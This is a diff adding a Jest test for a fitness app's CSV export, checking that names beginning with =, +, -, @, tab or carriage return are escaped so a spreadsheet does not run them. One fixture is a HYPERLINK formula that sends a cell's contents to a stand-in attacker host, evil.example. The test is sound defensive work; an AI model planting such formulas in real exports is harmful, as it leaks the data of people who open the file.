@@ -39,4 +39,15 @@ describe('sessionsToCsv', () => {
       exercises: [{ exerciseId: 'plank', name: 'Gainage', emoji: '🧱', timed: true, sets: [{ weight: 0, reps: 60, completed: true }] }] }] as GymSession[];
     expect(sessionsToCsv(gym, []).split('\n')[1]).toBe('2026-10-03 09:00:00,Musculation,0h 10m,Gainage,1,0,,,60,,,');
   });
+
+  it('neutralise les formules (= + - @ tabulation retour chariot en tête) : un nom piégé ne s’exécute pas dans le tableur', () => {
+    const gym = [{ date: ts(new Date(2026, 9, 3, 9, 0, 0)), duration: 600, title: '@SUM(1)', note: '-2+3',
+      exercises: [{ exerciseId: 'x', name: '=HYPERLINK("https://evil.example/?d="&A2,"Ouvrir")', emoji: '🏋️', note: '+1',
+        sets: [{ weight: 0, reps: 5, completed: true }] }] }] as GymSession[];
+    const renfo = [{ date: ts(new Date(2026, 9, 2, 9, 0, 0)), duration: 0, exercises: [{ name: '\tPompes', emoji: '💪', reps: 3 }, { name: '\rSquats', emoji: '🦵', reps: 4 }] }] as Session[];
+    const lines = sessionsToCsv(gym, renfo).split('\n');
+    expect(lines[1]!.split(',')[3]).toBe("'\tPompes");
+    expect(lines[2]!.split(',')[3]).toBe('"\'\rSquats"'); // quoted too: a bare CR splits the row in a spreadsheet
+    expect(lines[3]).toBe(`2026-10-03 09:00:00,'@SUM(1),0h 10m,"'=HYPERLINK(""https://evil.example/?d=""&A2,""Ouvrir"")",1,0,5,,,'+1,'-2+3,`);
+  });
 });
